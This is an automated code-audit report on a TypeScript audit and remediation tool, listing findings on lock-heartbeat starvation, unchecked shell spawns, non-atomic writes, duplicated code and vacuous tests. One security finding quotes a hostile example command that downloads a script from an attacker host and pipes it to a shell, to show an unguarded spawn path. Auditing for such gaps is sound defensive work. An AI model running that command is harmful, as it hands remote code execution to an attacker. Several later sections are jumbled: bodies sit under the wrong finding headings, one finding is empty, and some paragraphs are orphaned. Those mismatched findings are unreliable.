# Audit Report

## Executive Summary

The deterministic audit finalized 2,712 findings across 1,590 work blocks, dominated by five recurring root causes: synchronous child processes starving the mtime-heartbeat lock design, gates and predicates that exist but are skipped on specific entry points, error handling that resolves faults to success-shaped results (or unrecoverable throws), extensive copy-paste accretion whose drift now silently drops findings, and a very large test-validity class of assertions that cannot fail plus single-sourced safety mechanisms with no direct coverage. Conceptual design critiques are reported as their own theme rather than flattened into architecture: one-core-two-draws unrealized at the host-handoff seam, the bounded-call invariant triplicated, the buy-versus-build policy unenforced, and consent sequenced after tree mutation. Highest-leverage fixes are mechanical and shared: async bounded spawns, chokepoint routing for destructive operations, generated-or-verified contract copies, and deleting duplicated algorithm bodies in favor of the guarded canonical ones.

## Summary

- Findings: 2712
- Work blocks: 1590
- Severity breakdown: high: 40, medium: 1164, low: 1405, info: 103
- Lens breakdown: architecture: 38, config_deployment: 42, correctness: 325, data_integrity: 117, maintainability: 1436, observability: 220, operability: 4, performance: 5, reliability: 105, security: 32, tests: 388
- Grounding (S7): grounded: 1805, ungrounded: 8 — ungrounded findings are surfaced-not-confirmed below
- Fully audited files: 880
- Excluded non-auditable files: 266

## Top Risks

- Live-lock theft on remediation state: closing-gate suites and normal-lane required-test reruns run synchronously inside the phase lock, starving the heartbeat so a concurrent acquirer steals a LIVE lock and mutates state.json mid-run (ARC-305e7ec5, SEC-6377cd3f, DAT-f3d81e3f-2).
- Arbitrary-scope destruction with no guard: cleanup --force deletes any resolved path including the working tree, sample-run overwrites a genuine audit bundle with fabricated state, and phase-1 auto-fix reformats uncommitted user work roughly nine obligations before the operator confirms anything (COR-e815b429, COR-34018c74, ARC-2d5421de).
- Write-scope guarantee collapses to host attestation: resolved_no_change decisions and landed results on non-git roots are accepted with no corroboration, letting out-of-scope edits count as resolved and never enter applied_edit_surface (SEC-00c31ecc, SEC-d142de22).
- Silent data loss in core algorithms: sameLensDedupe's missing absorbed-guard permanently drops findings unioned into an absorbed survivor, and space-containing paths fabricate phantom nodes and lose real coupling edges in the decomposition graph (COR-7a36066f, COR-4db6ff5a).
- Declared-command-shape differential execution: test_command strings that the triage gate and handoff builder refuse as out-of-contract execute verbatim through shell:true when the same run reaches closing (SEC-305e7ec5).
- Fail-open gates hide real work and real damage: unparseable git status reads as a clean tree, missing required host assets deploy nothing yet exit zero, and packaged installs silently lose the Tier-S parsers so audits ship materially weaker graphs with no signal (REL-4742dfbb, CFG-eefa6f69, CFG-eaffc6ab).

## Themes

### T-001 — Synchronous child processes starve the liveness machinery the design depends on

- Root cause: Contract-assessment cluster: several hot paths spawn children synchronously (spawnSync, often with no timeout) while the advance holds the phase lock or runs on the single event loop. The staleness model judges locks by mtime refreshed by a setInterval heartbeat, which only fires while the loop runs, so any long synchronous child makes a LIVE holder look stale and stealable.
- Findings: ARC-305e7ec5, SEC-6377cd3f, ARC-656bd795, COR-97f16543, COR-dad3c544
- Suggested fix pattern: Make every child spawn asynchronous with a bounded timeout mapped into the existing degrade-to-status path, and move long-running work outside the lock behind the precomputed-verdict pattern the recovery verb already uses (src/remediate/steps/dispatch/hostHandoff.ts).

### T-002 — Cross-invocation state persistence bypasses the atomic, locked house pattern

- Root cause: LockedJsonStore plus withFileLock is the declared substrate for guarded state, but sibling writers hand-roll weaker equivalents: a bare in-place writeFile inside lockedJsonMutate, plain unlocked read-modify-write over expected-submissions.json, and a stat-then-read window in the stale-lock steal that can adopt a fresh token. Each is a locally small deviation from a pattern whose whole point is crash and concurrency safety.
- Findings: DAT-f3d81e3f, DAT-f3d81e3f-2, ARC-5dc13564
- Suggested fix pattern: Route every guarded read-modify-write through LockedJsonStore (temp-plus-rename persistence, absent-vs-unreadable distinguished), and close the steal-side TOCTOU by reading the token under the same atomic claim that judges staleness.

### T-003 — Gates and funnels exist but are not applied on every path that reaches them

- Root cause: Contract-assessment cluster: the repo builds the right predicates (admitSpawn consent veto, commandLeavesDeclaredShape, allowed_files re-check, the INV-RS-10 final gate) yet individual entry points skip them: closing-gate test/e2e spawns, resolved_no_change ingestion, non-git-root ingestion, cleanup --force, sample-run overwrites, consent for tree-mutating formatters, and the clarification-resolution transition straight to closing.
- Findings: SEC-305e7ec5, SEC-d142de22, SEC-00c31ecc, COR-e815b429, COR-34018c74, ARC-3152b5c6, COR-e362503b
- Suggested fix pattern: Funnel each operation class through its single existing chokepoint so skipping is impossible rather than discouraged, and state any uncovered half at the site the way triage.ts does, per the enforce-in-tooling invariant.

### T-004 — Error paths resolve to the wrong outcome in both directions: silent success and unrecoverable throw

- Root cause: Swallowed reads, coerced fallbacks, and presence-only gates turn faults into success-shaped results (unparseable git status reads as a clean tree, a missing --results value no-ops green, a mistyped baseline gates against a phantom 0 percent, a crashed analyzer scan reports as findings), while the opposite defect throws past every gate where a structured refusal was expected, wedging subsequent steps.
- Findings: OBS-87f3b9ae, REL-d0b99606, REL-4742dfbb, OBS-7d24da96, OBS-8e531e56, OBS-c188d6fc, OBS-d75f4175, OBS-1c4e442e, OBS-a9f2522f, REL-b019d3b9, COR-27f0f33c, CFG-88077f20, COR-bbe6c9e1, COR-114e4941, COR-114e4941-2
- Suggested fix pattern: Adopt the module's own stated direction (faults must over-fire, never silence): distinguish absent from unreadable, validate input shape before coercion, and replace post-gate throws with typed refusal values the frontier can drain.

### T-005 — Drops and degenerations happen correctly but are recorded unfaithfully

- Root cause: Several stages collapse distinct causes into one undifferentiated outcome: checkpoint filter drops carry no reason, cap-tripped suite edges vanish without a marker, integrity checks cannot separate nothing-checked from all-clean, telemetry keys off prose prefixes, and summary counters are hardcoded to zero, so operators cannot audit what the tool actually did.
- Findings: OBS-00c31ecc, OBS-9ab63e19, OBS-a6f2edcb, OBS-c0c350f3, OBS-de4d3e14, OBS-17aa79e6, OBS-87a3ac29, COR-3152b5c6
- Suggested fix pattern: Give every drop, skip, and suppression a machine-readable reason field in the artifact it is already recorded in, and key events on identifiers rather than message wording; report examined-counts alongside clean-verdicts.

### T-006 — Two coexisting declarations of one contract, with no mechanism forcing them to agree

- Root cause: Published JSON schemas disagree with the zod validator of record and the dispatch contract; a projection omits a field a consumer reads; templates and charter docs describe checks the named code does not implement; the wrapper envelope schema is imported by nothing. Each side was correct when written; nothing regenerates or verifies one from the other.
- Findings: DAT-78b9b908, DAT-da3f8610, MNT-4baae04e, MNT-4edcfb2e, ARC-036e1ae5, MNT-7b8bba4a, TST-787041a0
- Suggested fix pattern: Single-source each contract and generate the derived copy (schema from zod, render from registry, template from emitted response shape), or add a conformance check to verify:checks that fails when the copies diverge.

### T-007 — Correctness properties rest on convention and memory instead of mechanism

- Root cause: Artifact identity depends on every extractor remembering stable array order; DAG acyclicity is assumed, never asserted; guard allowlists exempt whole files; and the single-sourced identity and command-shape schemes have zero direct tests, so the property survives only as long as nobody touches its surroundings.
- Findings: DAT-194edc49, DAT-7d1c28ba, MNT-47cfaa44, TST-62841714, TST-d840bebb, TST-d840bebb-2
- Suggested fix pattern: Move each property into the tool that can guarantee it: hash the stable projection at the single chokepoint, assert acyclicity where the map is defined, shrink allowlists to line-scoped exemptions, and pin the shared schemes with direct contract tests.

### T-008 — Free-text strings doing structural work corrupt data silently

- Root cause: Space-delimited pair keys, comma-splitting a prose reason field, brace-blind regexes over route objects, and argv arrays re-parsed through a shell all encode structure in delimited text; when real-world content contains the delimiter, edges are misattributed, partitions gain phantom nodes, routes lose prefixes, and commands execute tokens that were never intended.
- Findings: COR-4db6ff5a, COR-4db6ff5a-2, DAT-d6292178, REL-74363fa8, REL-305e7ec5
- Suggested fix pattern: Replace joined-string keys with structured tuples or escaped encodings, model commands as argv end-to-end with shell interpretation refused at the boundary, and treat optional prose fields as provenance only, never as a grammar.

### T-009 — Copy-paste accretion, already drifted, now causes actual data loss

- Root cause: The dedupe comparison exists eight-plus times across modules; sameLensDedupe's private copy lacks the mid-scan absorbed-guard the shared crossLens pass enforces, and that missing guard silently discards findings. The same ratchet produced near-identical wrapper pairs outside the jscpd scan, a comparator declared eight times, and multi-thousand-line modules carrying six unrelated responsibilities.
- Findings: COR-ccf4eccd, COR-7a36066f, MNT-d1536dc4, MNT-c2dc7f9c, MNT-8c57fd61, MNT-5c9ad83a, MNT-8dcdf3f0, MNT-3cc44eb1, MNT-8dcdf3f0-2, MNT-65d1b47c, MNT-d8e2f0a5, MNT-59568e6a, MNT-5f08edfd, MNT-305e7ec5, MNT-d93fd1cc, MNT-c659dfe9, MNT-60c7c4cc, MNT-a9e8eebf
- Suggested fix pattern: Delete the copies and import the single canonical implementation (this also fixes the data-loss bug for free), extend the duplication ratchet to cover wrapper/, and split the accreted modules along the subsystem seams their own comments already name.

### T-010 — Test suite pins the wrong things: assertions that cannot fail and safety code with no coverage

- Root cause: A large class of findings shows green coverage that verifies nothing: fixtures lacking the very condition named (no cycle in the cyclic-seam test), assertions wrapped in may-not-fire guards, self-referential literal checks, as-never mutes, and suites coupled to live repo prose, alongside single-sourced safety mechanisms (ledger validation, anchor provenance, clause identity, build locks, ingest merges) that no test executes directly.
- Findings: TST-c86ecc0f, TST-a50bce42, TST-d1d47352, MNT-31358e1c, MNT-9f73ff54, MNT-d822128a, MNT-8b476d30, TST-e6e4ba38, COR-b43dfa94, TST-397ff2f6, TST-f904d6e5, MNT-6f25c5b7, MNT-7d179ea3, TST-3eb61dfc, DAT-7bf58644, TST-3303d7d8, TST-403372fd, TST-001bbba3, TST-bd0afe39, TST-de4d3e14, TST-d00cb443, TST-0d7c40c5, TST-13be0d58, TST-1660a523, TST-2ca40c68, TST-3d4b8df4, TST-37de03bc, TST-2fd5edc6, TST-a9e8eebf, MNT-bd447044
- Suggested fix pattern: Repair vacuous tests by asserting the discriminating observable (the cycle exists, the failure_context appears, the spy counted), delete tested-but-unwired symbols, and give each declared single-source scheme a direct contract test so regression fails loudly.

### T-011 — Conceptual design critique (kept distinct from contract assessment): standing decisions the shipped structure contradicts

- Root cause: These are not localized defects but critiques of direction: one-core-two-draws is unrealized at the largest shared seam; the bounded-step invariant is enforced three different ways with the harshest variant on remediate; the two-tier buy-versus-build policy has no enforcement while being crossed; expected:false perspective lanes sit wholly outside the fail-closed acceptance seam; auto-fix reorders consent after mutation; and the lock contradicts the policy bullet that would classify it. Each names a better architecture, not just a bug.
- Findings: ARC-e96acb7e, ARC-cc6091dd, ARC-f3d81e3f, ARC-b7728381, ARC-2d5421de, REL-f3d81e3f
- Suggested fix pattern: Decide the principle once at the owning altitude, then let structure enforce it: extract a parameterized shared workload/result core, state the bounded-call bound in the engine, declare a buy-class register with a red-build check, add a well-formedness gate at judge-ingest, and sequence auto-fix behind the confirmed intent checkpoint with a dry-run preview.

### T-012 — The published artifact behaves differently from the developer checkout

- Root cause: Capabilities exercised in-repo depend on devDependencies a consumer never receives, a missing required host asset deploys nothing yet exits zero, and equals-form CLI flags are silently overridden by appended wrapper defaults, so what ships is quietly weaker than what was verified.
- Findings: CFG-eaffc6ab, CFG-eefa6f69, REL-e7024d7e
- Suggested fix pattern: Move parser runtimes to optionalDependencies so the graded path engages by default, make required-asset absence a hard install failure, and parse flags positionally so user-supplied values win over appended defaults; surface degradation counts in the run summary.

### ARC-305e7ec5 — Closing-gate spawnSync starves the phase-lock heartbeat, recreating the double-hold the recovery path explicitly engineered away

INV-SCC-08 (src/shared/io/fileLock.ts:179-226) guarantees a LIVE lock holder is never classified stale: startLockHeartbeat re-stamps the lock mtime every STALE_LOCK_MS/3 via a setInterval callback.

- Severity: high
- Confidence: high
- Lens: architecture
- Grounding: grounded
- Systemic: yes
- Files: `src/remediate/phases/close.ts`, `src/remediate/steps/nextStep.ts`, `src/shared/io/fileLock.ts`, `src/remediate/steps/dispatch/hostHandoff.ts`
- Details: INV-SCC-08 (src/shared/io/fileLock.ts:179-226) guarantees a LIVE lock holder is never classified stale: startLockHeartbeat re-stamps the lock mtime every STALE_LOCK_MS/3 via a setInterval callback. That guarantee holds only while the event loop runs. The remediation closing gate runs `runCombinedTestSuite` (src/remediate/phases/close.ts:933-963) and `runE2eTests` (src/remediate/phases/close.ts:1062-1091) as SYNCHRONOUS `spawnSync(..., { shell: true })` with NO `timeout` option, and closing executes inside the whole-advance mutex (`decideNextStepLoop` wraps `advanceUnderPhaseLock`, which reaches `handleClosing`, in `withFileLock(<artifactsDir>/phase.lock)` — src/remediate/steps/nextStep.ts:4286-4290, 4303-4306). Counterexample: a combined suite that runs longer than STALE_LOCK_MS (30s) blocks the event loop for its entire duration, so zero heartbeats fire; after 30s the lock file's mtime is stale, a concurrent `next-step` acquirer wins the lease-style steal (stealStaleLock, fileLock.ts:121-159 — the token check passes because the content is unchanged) and mutates state.json while the closing gate is still mid-run: two live writers on one guarded file. The repo already knows this exact mechanism and solved it on ONE path: the recovery verb precomputes required-test verdicts OUTSIDE the lock precisely because 'running one inside the state lock would starve the lock's own heartbeat timer and let a second acquirer reclaim the lock as stale mid-hold' (src/remediate/steps/dispatch/hostHandoff.ts:1232-1252, and runRequiredTest there carries a timeout). The normal closing path applies neither mitigation. Recommended change: make the closing suites async (spawn + await) like the rest of the advance, or move their execution outside the phase lock behind the same precomputed-verdict pattern; either removes the starvation mechanically instead of bounding suite length by hope.
- Evidence: 5 items (top: "runtime:flow:flow:host:remediation-final-gate: confirmed — Deterministic runtime command succeeded: npm test") — see audit-findings.json for the full list

### SEC-305e7ec5 — Declared-command-shape gate covers triage and required-test spawns but not the closing gate's test/e2e spawns

The shared rule (src/shared/tooling/commandShape.ts:7-14) states the contract: these strings reach `shell: true` in the repository root, so anything that chains, redirects, substitutes or subshells turns one declared command into arbitrary execution, and every spawner must ask `commandLeavesDeclaredShape` before spawning.

- Severity: high
- Confidence: high
- Lens: security
- Grounding: grounded
- Systemic: yes
- Files: `src/remediate/phases/close.ts`, `src/remediate/phases/triage.ts`, `src/remediate/steps/dispatch/hostHandoff.ts`, `src/shared/tooling/commandShape.ts`
- Details: The shared rule (src/shared/tooling/commandShape.ts:7-14) states the contract: these strings reach `shell: true` in the repository root, so anything that chains, redirects, substitutes or subshells turns one declared command into arbitrary execution, and every spawner must ask `commandLeavesDeclaredShape` before spawning. Three of the four spawn sites comply: the host-handoff boundary refuses a bad shape at build time (src/remediate/steps/dispatch/hostHandoff.ts:421-439) before its verbatim spawn (:1373), and the triage re-verify path asks the predicate immediately before its shell spawn (src/remediate/phases/triage.ts:138-147). The closing gate does not: `runCombinedTestSuite` spawns `state.plan.test_command` (src/remediate/phases/close.ts:947-952) and `runE2eTests` spawns `state.plan.e2e_command` (close.ts:1072-1077) through `shell: true` with no shape check anywhere on the path — `test_command` is an unconstrained optional string off the extracted plan (src/remediate/state/types.ts:97; src/remediate/steps/nextStep.ts:629-630). Concrete counterexample: a plan whose test_command is `npm test && curl attacker | sh` is refused as out-of-contract if the item ever blocks (triage) and never admitted across the handoff, yet the SAME string executes verbatim in the repo root when the run reaches closing, and its exit code folds into `fullyGreen`/completion gating. This is the project's own 'enforce in tooling, never host discretion' invariant half-covered: the predicate exists and is one import away, and the uncovered half is not stated at the site (contrast triage.ts:130-139, which states its exposure). Fix: apply the same shared predicate (refuse or classify) at both close.ts spawn sites.

### COR-b43dfa94 — chunkLineCount loops forever on chunkSize <= 0 and has no production caller

### OBS-ed78bb85 — external_analyzer_results.json stamps generated_at per entry and the array-typed artifact bypasses the non-semantic-field strip entirely

- Grounding: grounded

Every re-acquisition of a semantically unchanged tree therefore persists new stamps, moves the sha256 content hash from hashArtifactValue, and cascades phantom staleness to the lead-consuming downstream steps. The same applies to the sibling acquisition marker artifact, whose entries also embed ExternalAnalyzerToolStatus records stamped by the same normalizer output.

The package's persistence contract is atomic replace: the shared IO layer provides `writeFileAtomic` (temp file + rename-over-destination, src/shared/io/json.ts:88-117) and routes `writeJsonFile` through it (json.ts:176), precisely because 'writeFile in that position can be interrupted between truncate and the last flush' leaving a torn destination.

- Severity: medium
- Confidence: high
- Lens: data_integrity
- Grounding: grounded
- Systemic: yes
- Files: `src/shared/io/fileLock.ts`, `src/shared/io/json.ts`
- Details: The package's persistence contract is atomic replace: the shared IO layer provides `writeFileAtomic` (temp file + rename-over-destination, src/shared/io/json.ts:88-117) and routes `writeJsonFile` through it (json.ts:176), precisely because 'writeFile in that position can be interrupted between truncate and the last flush' leaving a torn destination. `lockedJsonMutate` — the read-mutate-write helper added to close the TOCTOU window (src/shared/io/fileLock.ts:363-390) — ends its critical section with a bare `await writeFile(jsonPath, JSON.stringify(next, null, 2), "utf8")` (fileLock.ts:383). The lock serializes concurrent writers but does nothing about a crash, OOM kill, or power loss mid-write: the result is a truncated state/JSON artifact that the NEXT reader parses eagerly (`readJsonIfExists` → `JSON.parse`, fileLock.ts:352-361) and throws on, turning a recoverable crash into a wedged artifact. Counterexample: process dies halfway through writing a large analyzer-policy or ledger JSON via lockedJsonMutate; every subsequent acquire succeeds but every subsequent read throws SyntaxError, with no `.tmp` residue to recover from because no temp was ever used. The fix is mechanical and local: route the inner write through the existing `writeFileAtomic` (or writeJsonFile) so the module that owns mutual exclusion also inherits the durability floor the rest of the IO layer already guarantees.
- Evidence: 2 items (top: "runtime:flow:flow:host:remediation-state-machine: confirmed — Deterministic runtime command succeeded: npm test") — see audit-findings.json for the full list

Improvement: keep the floor-first ordering (a broken build does make later layers less meaningful) but run the independent layers concurrently via mapWithConcurrency and, on failure, still execute the remaining layers and report every failure's tail in one pass. ### COR-f9c11371 — CHANGED commits derive intent_baseline.revision from the frozen entry revision, so repeat changes never advance it

In runIntentEquivalenceResolve, every resolveChanged() stamps revision as currentEntryRevision(bundle)+1 and never floors at the prior intent_baseline revision, and withBaseline() does not touch metadata.artifacts - so two CHANGED resolutions occurring before the next metadata pass both compute the SAME revision number, and the second genuine intent change leaves downstream staleness unchanged (the unsafe under-stale direction this module's own contract forbids).

- Severity: medium
- Confidence: medium
- Lens: correctness
- Grounding: grounded
- Impact: The header contract states a committed changed 'advances baseline.revision (downstreams re-stale exactly once)'. Because currentEntryRevision reads metadata.artifacts["intent_checkpoint.json"].revision - which only moves when the metadata stamper later mirrors the baseline - consecutive CHANGED arms (e.g. a structured change, then an interleaved host edit resolved again in the same drain window) stamp identical revisions. A downstream artifact derived at revision R sees baseline.revision still R+1 after the second change and is wrongly treated as fresh, running the audit against stale scoping. The equivalent arm already reads the prior baseline revision (bundle.artifact_metadata?.intent_baseline?.revision), so the fix is local: revision: Math.max(currentEntryRevision(bundle), bundle.artifact_metadata?.intent_baseline?.revision ?? 0) + 1.
- Likelihood: medium
- Files: `src/audit/orchestrator/intentEquivalenceExecutor.ts:138–144`
- Evidence: 4 items (top: "Header contract, same file lines 8-9: "a committed `changed` advances `baseline.revision` (downstreams re-stale exactly once)".") — see audit-findings.json for the full list

### OBS-b764ff2b — Cycle detection keeps the unbounded recursion its sibling seam walk explicitly removed

dfsVisit in detectCycles recurses once per node along a DFS path with no depth guard, while deriveSeams in the same file converted to an explicit-stack DFS specifically so deep graphs cannot overflow the call stack; on a repo with a very deep structural import/call chain, deriveGraphSignals fails with a bare RangeError instead of degrading, and nothing in this layer catches or labels the failure, so the operator sees a raw stack overflow with no indication of which repo shape triggered it.

- Severity: medium
- Confidence: medium
- Lens: observability
- Grounding: grounded
- Impact: The failure mode is a crash mid-signal-derivation rather than a degraded result, and the inconsistency is visible in-file: the seam half documents and solves the exact hazard the cycle half still exposes. ### DAT-ad865049 — Flow id sanitizer is not injective, so distinct paths can mint identical flow ids

- Severity: medium
- Confidence: medium
- Lens: data_integrity
- Grounding: grounded
- Systemic: yes
- Impact: A repo containing both spellings loses a critical-flow (or data-evolution) flow without any diagnostic, because dedupeFlows keys on name|paths|concerns and the two flows have different names, so both enter the manifest with clashing ids. Downstream, whichever flow the Map construction order keeps last wins; a host fallback submitted against the shared id upgrades an arbitrary one of the pair, so the manifest's id-to-flow mapping is not well defined.
- Likelihood: low

Two exposure windows follow. (1) Crash/torn write: a merge killed mid-write leaves a partial run-results.json — the artifact findings synthesis consumes — and the 'no destructive truncation' guard does not help because the file is half-written rather than wrongly emptied. (2) Concurrent merge: two invocations computing different `passing` sets last-writer-wins the same path, silently dropping the loser's accepted results while both report success; the duplicate-task_id defense operates WITHIN one invocation's directory listing only. There is also a two-file ordering hazard: failed-tasks.json is written before run-results.json (:166-178), so a crash between the two persists a failure record for a merge whose results were never written. The package already owns the remedy (LockedJsonStore / withFileLock keyed on the run directory, plus writeFileAtomic); this critical flow ('findings synthesis emitting the machine contract' consumes these files) simply predates or bypasses it.

### COR-a05e19e4 — computeCriticalPathMs double-counts the shared job when the needs graph has a cycle

On a cycle, walk() detects the revisit and returns only the revisited job's own duration (discarding nothing, memoizing nothing), and every caller on the cycle then adds its own duration on top - so a job on a dependency cycle is counted once extra per cycle member, inflating the reported critical path.

- Confidence: high

### DAT-e96acb7e — Coverage contract forces reviewed_lines == total_lines, making partial review indistinguishable from full review

The audit result-ingest validator refuses any file_coverage entry whose reviewed_lines differs from total_lines (src/audit/cli/dispatch/hostHandoff.ts:906-915: 'must report reviewed_lines equal to total_lines'), and separately pins each path's total_lines to the binding's file_line_counts (:916-925) and requires exact scope coverage (:927-934).

- Severity: low
- Confidence: high
- Lens: data_integrity
- Grounding: grounded
- Files: `src/audit/cli/dispatch/hostHandoff.ts`
- Details: The audit result-ingest validator refuses any file_coverage entry whose reviewed_lines differs from total_lines (src/audit/cli/dispatch/hostHandoff.ts:906-915: 'must report reviewed_lines equal to total_lines'), and separately pins each path's total_lines to the binding's file_line_counts (:916-925) and requires exact scope coverage (:927-934). The composite effect is that the ONLY acceptable submission asserts complete review of every bound file, so the field carries zero information: a host that skimmed or skipped a file must either submit a false equality or fail ingestion entirely, and the tool cannot tell a genuine full pass from a coerced one. The contract therefore records an attestation it cannot verify and simultaneously forbids the honest intermediate states (partial review, reviewed-with-follow-up) that a bounded host context makes likely on large bound files. Observational recommendation, not a redesign: either drop reviewed_lines (it is derivable — it always equals the bound total) and keep the explicit full-coverage attestation in the prompt text, or widen the contract to accept a reported reviewed_lines below the bound as a classified partial-coverage outcome the orchestrator can act on, so the machine contract stops encoding 'full review' as the only representable fact.
- Evidence: runtime:unit:src-audit: confirmed — Deterministic runtime command succeeded: npm test

### COR-707261fb — Prototype-chain 'in' check admits unknown relationship kinds the contract says must be rejected

Such a relationship is silently accepted instead of throwing the contracted Error('Unknown content-coherence relationship kind ...'), and its mapped lookup yields a function that is added to the evidence set and later assigned as a junk property on the evidence object (evidence[fn] = true), contributing no real evidence bit. The net effect is that a misspelled or bogus kind is swallowed rather than rejected, weakening the validate-at-the-boundary guarantee this module otherwise enforces strictly (unknown endpoint ids, self-reference, and non-object entries all throw). Using Object.hasOwn(RELATION_EVIDENCE, entry.kind) (or a Set of the known kinds) restores the contract.

### SEC-7cb94cd3 — First-write-wins baseline is a check-then-rename race; a concurrent duplicate registration can replace the baseline

Two processes registering the same session_id concurrently both pass existsSync and both rename, so last-writer-wins can refresh the stored baseline contrary to the documented first-write-wins guarantee; the failure direction is gate over-firing, not silence.

- Severity: low
- Confidence: medium
- Lens: security
- Grounding: grounded
- Impact: The documented invariant (comment block at lines 126-131: a resume re-fire must NOT refresh the baseline) holds only when writers are serialized. If two SessionStart firings with the same id interleave between the existsSync check and the rename, the second rename silently replaces the record, resetting baseline to the newer capture; work created between the two captures is then misclassified as foreign. Verified direction: the resulting misclassification makes closeout/friction gates fire MORE (whole-tree suspicion), never less, so this cannot silence the owner - it costs false positives in a narrow interleaving window. ### COR-ce7a29fc — Persisted artifact ordering flows through localeCompare, making artifact bytes locale/platform-dependent

The anchor array persisted in FileAnchorSummary (and merged route edges persisted in graph_bundle) is ordered with String.localeCompare, whose output varies with ICU locale/platform, so identical inputs can serialize to different bytes on different machines - churning the artifact content hash and cascading phantom staleness down the dependency DAG, against the repo invariant that extractor array order be a stable content-derived key.

- Severity: low
- Confidence: medium
- Lens: correctness
- Grounding: grounded
- Systemic: yes
- Impact: localeCompare delegates to the ICU collator: Node built with full-icu orders by the ambient locale, small-icu builds fall back differently, and case/punctuation/diacritic weightings differ across platforms. Anchor names are extracted identifiers and route handlers are arbitrary source strings, so ties broken by these comparators can reorder between machines. Both outputs feed persisted artifacts (file-anchors packets, graph_bundle.json routes) whose content keys drive the staleness DAG per CLAUDE.md's stable-order rule ('ordered by a stable key derived from content ... never filesystem / readdir / iteration order' - the same hazard class, here introduced via locale sensitivity instead of iteration order). Replacing each localeCompare(a,b) with the plain relational comparison (a < b ? -1 : a > b ? 1 : 0) makes the order byte-stable code-point-wise with no behavioral loss for identifier/path strings. Scheduling-order uses of localeCompare (flowPlanning candidate sort, flowRequeue) are unaffected and need no change.
- Likelihood: medium
- Files: `src/audit/orchestrator/fileAnchors.ts:413–414`, `src/audit/orchestrator/graphEnrichmentExecutor.ts:84–85`

### OPR-eaffc6ab-2 — The src tree is typechecked twice per gate run - check:tests is a strict superset of build, and the documented pre-push ritual pays tsc three times

verify:checks runs check:tests (tsc -p tsconfig.test.json, noEmit over src plus tests) and later build (tsc -p tsconfig.json, emit over src) in the same serial chain - the src tree is fully typechecked twice per run.

- Severity: low
- Confidence: medium
- Lens: operability
- Grounding: grounded
- Systemic: yes
- Files: `package.json`, `tsconfig.json`, `tsconfig.test.json`
- Details: verify:checks runs check:tests (tsc -p tsconfig.test.json, noEmit over src plus tests) and later build (tsc -p tsconfig.json, emit over src) in the same serial chain - the src tree is fully typechecked twice per run. The documented green-at-every-commit ritual (npm run build && npm run check) is worse: build already fails on any src type error, so the follow-up check (tsc over src with --noEmit) re-pays the same program and can only re-report what build just proved clean - and the two scripts exist as separate names (check, check:tests) whose superset relationship is implicit knowledge rather than stated. This is distinct from the banked parallelize-independent-verify-legs item: the improvement is eliminating a redundant leg, not overlapping independent ones. Fix: make one script the single type gate - check becomes an alias of the superset noEmit config (tsconfig.test.json) and check:tests is retired as a second name for the same thing - so the commit gate runs one typecheck and build's emit is the only src pass, removing both the double cost and the two-names-one-meaning drift surface.
